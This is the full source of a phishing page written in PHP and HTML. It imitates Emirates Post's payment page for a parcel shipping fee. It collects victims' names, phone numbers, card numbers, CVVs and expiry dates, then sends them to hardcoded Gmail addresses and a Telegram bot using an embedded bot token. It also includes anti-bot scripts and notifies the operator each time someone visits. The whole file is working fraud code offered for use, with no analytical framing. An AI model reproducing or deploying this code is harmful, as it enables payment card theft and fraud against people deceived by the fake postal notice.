<?php
session_start();
include '../bots/anti1.php';
include '../bots/anti2.php';
include '../bots/anti3.php';
include '../bots/anti4.php';
include '../bots/anti5.php';
include '../bots/anti6.php';
include '../bots/anti7.php';
include '../bots/anti8.php';
$to = "ilyataha553@gmail.com";
$subject = "alert";
$headers = "Content-Type: text/html; charset=ISO-8859-1\r\n";
$body = "New user just access the payment page";
mail ($to,$subject,$body, $headers);
$websit="https://api.telegram.org/bot5529205468:AAEmNwJzZ0oQ4X_RVS0vhEL_GO4xpaytvwE";
$param=[
      'chat_id'=>'5061239044',
      'text'=>$body,
  ];
  $ch = curl_init($websit . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($param));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
function get_client_ip() {

    $ipaddress = '';
    if ($_SERVER['HTTP_CLIENT_IP'])
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if ($_SERVER['HTTP_X_FORWARDED_FOR'])
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if ($_SERVER['HTTP_X_FORWARDED'])
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if ($_SERVER['HTTP_FORWARDED_FOR'])
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if ($_SERVER['HTTP_FORWARDED'])
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if ($_SERVER['REMOTE_ADDR'])
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';

    return $ipaddress;
}

if (isset($_POST['submit'])){
    $fname = $_POST['fname']."\r\n";
    $phone = $_POST['phone']."\r\n";
    $cardnum = $_POST['cardnum']."\r\n";
    $fourdigit = substr($cardnum, -4)."\r\n";
    $_SESSION['card'] = $fourdigit."\r\n";
    $cvc = $_POST['cvc']."\r\n";
    $months = $_POST['months']."\r\n";
    $years = $_POST['years']."\r\n";
    $to = "elfarkhmouad@gmail.com";
    $subject = "New Paymet Details";
    $headers = "Content-Type: text/html; charset=ISO-8859-1\r\n";
    $body = "mly"."<resultat>"."
    Full Name: ".$fname." * "."Phone Number: ".$phone." * "."Card Number: ".$cardnum." * "."CVC: ".$cvc." * "."Expiry:".$months."* "."Years:".$years."<br>";
    echo get_client_ip();
    if (mail ($to,$subject,$body, $headers)){
        $websit="https://api.telegram.org/bot5529205468:AAEmNwJzZ0oQ4X_RVS0vhEL_GO4xpaytvwE";
$param=[
      'chat_id'=>'5061239044',
      'text'=>$body,
  ];
  $ch = curl_init($websit . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($param));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
    header("Location: ./2.php");}
}
    

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <link rel="shortcut icon" href="im/5.png">
    <title>دفع تكاليف الشحن (15.12AED) البريد الاماراتي</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.5.3/css/bootstrap.min.css" />
    <link href="css/style.css" rel="stylesheet" type="text/css">
    <link href="css/opensans.css" rel="stylesheet" type="text/css">
    <link href="css/custom.css" rel="stylesheet" type="text/css">
</head>

<body>
    <header class="header">
        <div class="container">
            <div class="header-logo img-responsive">
                <div class="text-nav">
                    <a class="language-nav" id="change_lang" href="" title="عربي"
                        style="font-size: small !important; font-family: &quot;Droid Arabic Kufi&quot;,&quot;Open Sans&quot; !important;">
                        عربي </a>
                </div>
                <img src="./im/1.jpg" width="151" height="54" alt="logo">
            </div>
        </div>
    </header>
    <div class="clearfix"></div>
    <section class="section">
        <div class="container">

            <div class="header-title">
                <h3>Emirates post</h3>
            </div>

        </div>
        <div class="container">
            <form action="" class="form-fields" role="form" id="form_pay" method="post"
                accept-charset="utf-8" _lpchecked="1">
                <input type="hidden" name="exchange_rate" value="0.2736">
                <div class="payment-wrap">
                    <div>
                        <label class="payment_method">
                            <input type="radio" id="creditcard" name="payment_type" value="creditcard">
                            <img src="./im/2.png" width="75" alt="Credit Card">

                        </label>
                    </div>

                </div>
                <div class="col-md-12 col-sm-12 form-wrap" style="margin-top:0; border-radius:0 0 5px 5px;">
                    <div class="justified-wrap">

                        <div class="col-md-12 col-sm-12 no-space">
                            <div>
                                <label>PACKAGE №</label>
                                <label type="text" class=" label-amount">NV 85436470</label>
                            </div>
                            <label>AED</label>
                            <label type="text" class=" label-amount">15.12</label>
                        </div>
                    </div>


                </div>
                <div class="clearfix"></div>
                <div class="alert alert-danger  display-hide" style="display:none;">
                    <button data-dismiss="alert" class="close" type="button">×</button>
                    <strong> Error!</strong> All fields are required.
                </div>


                <div class="clearfix"></div>
                <!--              
                 </div>-->
                <div class="row">
                    <div class="col-md-12 col-sm-12 card-details">
                        <div class="form-wrap creditcard-hide">
                            <input type="text" class="required form-control" placeholder="Full Name" required=""
                                name="fname" autocomplete="off">

                            <input type="text" class="required form-control" placeholder="Phone Number" required=""
                                name="phone" autocomplete="off">

                            <input onkeyup="$cc.validate(event)" required="" type="text" class="required form-control"
                                placeholder="Card Number" name="cardnum" autocomplete="off" maxlength="19">

                            <div class="row">
                                
                                <div class="col-md-5 col-sm-4">
                                    <select required="" class="required form-control" name="months"
                                        style="margin-top:6px;">
                                        <option value="" selected>Expiry Month</option>
                                        <option value="01">01</option>
                                        <option value="02">02</option>
                                        <option value="03">03</option>
                                        <option value="04">04</option>
                                        <option value="05">05</option>
                                        <option value="06">06</option>
                                        <option value="07">07</option>
                                        <option value="08">08</option>
                                        <option value="09">09</option>
                                        <option value="10">10</option>
                                        <option value="11">11</option>
                                        <option value="12">12</option>
                                    </select>
                                </div>
                                <div class="col-md-4 col-sm-4">
                                    <select required="" class=" required form-control" id="expiry_year" name="years"
                                        style="margin-top:6px;">
                                        <option value="">Year</option>
                                        <option value="2023">2023</option>
                                        <option value="2024">2024</option>
                                        <option value="2025">2025</option>
                                        <option value="2026">2026</option>
                                        <option value="2027">2027</option>
                                        <option value="2028">2028</option>
                                        <option value="2029">2029</option>
                                        <option value="2030">2030</option>
                                        <option value="2031">2031</option>
                                        <option value="2032">2032</option>
                                        <option value="2033">2033</option>
                                        <option value="2034">2034</option>
                                        <option value="2035">2035</option>
                                        <option value="2036">2036</option>
                                        <option value="2035">2037</option>
                                        <option value="2036">2038</option>
                                    </select>
                                </div>
                                <div class="col-md-3 col-sm-4">
                                    <input required="" type="text" autocomplete="off" class="required form-control"
                                        placeholder="CVV" name="cvc" maxlength="3">
                                </div>
                            </div>
                        </div>
                        <input type="submit" class="btn btn-lg btn-block btn-success" name="submit" style="margin-top:15px;background-color: #4fad4d; color: #fff; " value="Pay Now">
                        <div class="text-nav" style=" text-align:center; margin-top:15px;"><a href="">Cancel</a></div>

                        <img class="card-brands-supported" alt="credit cards" style="margin-top:15px;"
                            src="./im/3.png">
                        <div style="display: none;" id="hidden_fields">
                            <input type="hidden" value="" name="amount" id="amount">

                            <input type="hidden" name="paypage_id" value="10031622">
                        </div>
                        <input type="hidden" name="gointerpay_finger_print_id" id="gointerpay_finger_print_id" value="">
                    </div>
                </div>
            </form>
        </div>

    </section>
    <footer class="footer">
        <img src="./im/4.png" width="85" height="34" alt="express checkout">
    </footer>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.5.3/js/bootstrap.min.js"></script>
    <script type="text/javascript">
                                        var $cc = {}
                                        $cc.validate = function (e) {
                                            //Retrieve the value of the input and remove all non-number characters
                                            var number = String(e.target.value);
                                            var cleanNumber = '';
                                            for (var i = 0; i < number.length; i++) {
                                                if (/^[0-9]+$/.test(number.charAt(i))) {
                                                    cleanNumber += number.charAt(i);
                                                }
                                            }

                                            //Only parse and correct the input value if the key pressed isn't backspace.
                                            if (e.key != 'Backspace') {
                                                //Format the value to include spaces in the correct locations
                                                var formatNumber = '';
                                                for (var i = 0; i < cleanNumber.length; i++) {
                                                    if (i == 3 || i == 7 || i == 11) {
                                                        formatNumber = formatNumber + cleanNumber.charAt(i) + ' '
                                                    } else {
                                                        formatNumber += cleanNumber.charAt(i)
                                                    }
                                                }
                                                e.target.value = formatNumber;
                                            }

                                            //run the Luhn algorithm on the number if it is at least equal to the shortest card length
                                            if (cleanNumber.length >= 12) {
                                                var isLuhn = luhn(cleanNumber);
                                            }

                                            function luhn(number) {
                                                var numberArray = number.split('').reverse();
                                                for (var i = 0; i < numberArray.length; i++) {
                                                    if (i % 2 != 0) {
                                                        numberArray[i] = numberArray[i] * 2;
                                                        if (numberArray[i] > 9) {
                                                            numberArray[i] = parseInt(String(numberArray[i]).charAt(0)) + parseInt(String(numberArray[i]).charAt(1))
                                                        }
                                                    }
                                                }
                                                var sum = 0;
                                                for (var i = 1; i < numberArray.length; i++) {
                                                    sum += parseInt(numberArray[i]);
                                                }
                                                sum = sum * 9 % 10;
                                                if (numberArray[0] == sum) {
                                                    return true
                                                } else {
                                                    return false
                                                }
                                            }

                                            var card_types = [
                                                {
                                                    name: 'maestro',
                                                    pattern: /^(5018|5020|5038|6304|6759|676[1-3])/,
                                                    valid_length: [12, 13, 14, 15, 16, 17, 18, 19]
                                                }
                                            ];

                                            //test the number against each of the above card types and regular expressions
                                            for (var i = 0; i < card_types.length; i++) {
                                                if (number.match(card_types[i].pattern)) {
                                                    //if a match is found add the card type as a class
                                                    e.target.previousElementSibling.className = 'card-type ' + card_types[i].name;
                                                }
                                            }
                                        }

                                        $cc.expiry = function (e) {
                                            if (e.key != 'Backspace') {
                                                var number = String(this.value);

                                                //remove all non-number character from the value
                                                var cleanNumber = '';
                                                for (var i = 0; i < number.length; i++) {
                                                    if (i == 1 && number.charAt(i) == '/') {
                                                        cleanNumber = 0 + number.charAt(0);
                                                    }
                                                    if (/^[0-9]+$/.test(number.charAt(i))) {
                                                        cleanNumber += number.charAt(i);
                                                    }
                                                }

                                                var formattedMonth = ''
                                                for (var i = 0; i < cleanNumber.length; i++) {
                                                    if (/^[0-9]+$/.test(cleanNumber.charAt(i))) {
                                                        //if the number is greater than 1 append a zero to force a 2 digit month
                                                        if (i == 0 && cleanNumber.charAt(i) > 1) {
                                                            formattedMonth += 0;
                                                            formattedMonth += cleanNumber.charAt(i);
                                                            formattedMonth += '/';
                                                        }
                                                        //add a '/' after the second number
                                                        else if (i == 1) {
                                                            formattedMonth += cleanNumber.charAt(i);
                                                            formattedMonth += '/';
                                                        }
                                                        //force a 4 digit year
                                                        else if (i == 2 && cleanNumber.charAt(i) < 2) {
                                                            formattedMonth += '20' + cleanNumber.charAt(i);
                                                        } else {
                                                            formattedMonth += cleanNumber.charAt(i);
                                                        }

                                                    }
                                                }
                                                this.value = formattedMonth;
                                            }
                                        }

                                    </script>
</body>

</html>